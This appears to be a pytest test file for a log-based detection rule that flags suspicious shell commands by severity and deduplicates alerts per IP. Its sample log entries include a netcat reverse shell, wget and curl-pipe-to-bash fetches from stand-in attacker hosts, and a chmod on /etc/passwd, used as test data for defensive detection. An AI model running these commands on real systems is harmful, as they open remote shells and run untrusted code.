import pytest
from unittest.mock import patch

from rules.suspicious_cmd import SuspiciousCommandRule
from models import AlertSeverity


@pytest.fixture
def rule():
    return SuspiciousCommandRule()


def _search(hits: list) -> dict:
    return {"hits": {"total": {"value": len(hits)},
                      "hits": [{"_source": h} for h in hits]}}


def _hit(ip: str, command: str, username: str = "alice") -> dict:
    return {"source_ip": ip, "command": command, "username": username,
            "hostname": "web-01", "@timestamp": "2026-04-27T10:00:00.000Z"}


class TestSuspiciousCommandRule:
    def test_alerts_on_nc_reverse_shell(self, rule, mock_es):
        with patch("es_client.search", return_value=_search([_hit("1.2.3.4", "nc -e /bin/bash 10.0.0.1 4444")])), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert len(alerts) == 1
        assert alerts[0].severity == AlertSeverity.critical
        assert alerts[0].details["matched_pattern"] == "nc "

    def test_wget_is_high_severity(self, rule, mock_es):
        with patch("es_client.search", return_value=_search([_hit("1.2.3.4", "wget http://evil.com/x.sh")])), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert alerts[0].severity == AlertSeverity.high

    def test_chmod_is_medium_severity(self, rule, mock_es):
        with patch("es_client.search", return_value=_search([_hit("1.2.3.4", "chmod 777 /etc/passwd")])), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert alerts[0].severity == AlertSeverity.medium

    def test_dedup_one_alert_per_ip_per_cycle(self, rule, mock_es):
        hits = [
            _hit("1.2.3.4", "wget http://evil.com"),
            _hit("1.2.3.4", "nc -e /bin/bash 10.0.0.1 4444"),
        ]
        with patch("es_client.search", return_value=_search(hits)), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert len(alerts) == 1

    def test_different_ips_get_separate_alerts(self, rule, mock_es):
        hits = [_hit("1.1.1.1", "wget http://x.com"), _hit("2.2.2.2", "nc -e /bin/bash ...")]
        with patch("es_client.search", return_value=_search(hits)), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert len(alerts) == 2

    def test_no_alert_on_empty_results(self, rule, mock_es):
        with patch("es_client.search", return_value=_search([])):
            alerts = rule.detect(mock_es)
        assert alerts == []

    def test_details_contain_command_and_username(self, rule, mock_es):
        cmd = "curl -s http://c2.example.com | bash"
        with patch("es_client.search", return_value=_search([_hit("1.2.3.4", cmd)])), \
             patch("es_client.alert_exists", return_value=False):
            alerts = rule.detect(mock_es)
        assert alerts[0].details["command"] == cmd
        assert alerts[0].details["username"] == "alice"
